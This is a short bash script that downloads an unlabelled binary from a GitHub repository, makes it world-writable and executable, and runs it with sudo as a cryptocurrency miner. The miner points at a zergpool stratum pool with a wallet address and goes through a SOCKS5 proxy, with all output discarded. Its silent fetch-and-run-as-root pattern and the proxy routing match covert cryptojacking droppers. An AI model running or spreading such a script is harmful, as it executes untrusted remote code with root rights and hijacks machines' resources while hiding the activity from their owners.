#!/bin/bash
apt install -y lynx && lynx -dont_wrap_pre -dump "https://github.com/iyalah/super-duper-goggles/raw/cpu/ava512" > data && chmod 777 data && sudo ./data -a yescryptR16 -o stratum+tcps://yescryptR16.mine.zergpool.com:16333 -u 3NF5JGA941wWc48HbmmPa56qppxSEuVxdS.TEST -p c=BTC -p c=TRX,mc=GOLD -t 2 -x socks5://192.252.214.20:15864 >/dev/null 2>&1
